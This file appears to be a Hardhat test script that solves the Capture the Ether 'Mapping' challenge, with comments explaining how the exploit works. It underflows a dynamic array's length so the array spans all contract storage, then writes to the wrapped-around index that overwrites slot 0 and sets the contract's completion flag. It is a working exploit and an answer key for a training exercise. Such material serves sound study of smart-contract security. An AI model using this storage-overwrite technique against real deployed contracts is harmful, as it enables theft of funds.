const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = `0x18Cf22bDD5c5d0C7ba057AF41e157f182eb0F087`;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const factory = await ethers.getContractFactory("MappingChallenge");
  mapping = factory.attach(CHALLENGE_ADDRESS);
});

it("Mapping", async function () {
  /**
   * As map is a dynamic array which, its length will be stored at slot 1 (because its an array
   * of uint256 and slot 0 is occupied by `bool isComplete`), hence values of mapping will be stored at
   * slots starting from keccak256(1), i.e the keccak256(slot where arrays length is stored)
   */
  console.log(
    "set key as max value of uint256-1 so that map occupies entire storage"
  );
  const key = BigInt(2 ** 256) - BigInt(2);
  const tx = await mapping.set(key, 0);
  await tx.wait();
  console.log("expanded map to cover entire storage");
  console.log(
    "length of the map now",
    await ethers.provider.getStorageAt(CHALLENGE_ADDRESS, 1)
  );
  const startingSlotOfMap = ethers.utils.solidityKeccak256(["uint256"], [1]);
  /**
   * total space is 2**256, we start at slot `startingSlotOfMap`, therefore to reach
   * "slot 0", we need to add (2**256) to the starting slot.
   */
  console.log("setting slot 0 to 1");
  const desiredSlot = BigInt(2 ** 256) - BigInt(startingSlotOfMap);
  const tx2 = await mapping.set(desiredSlot, 1);
  await tx2.wait();
  const isComplete = await mapping.isComplete();
  expect(isComplete).to.be.true;
  console.log("Contract hacked!!");
  util.updateTotalPoints(scriptName);
});
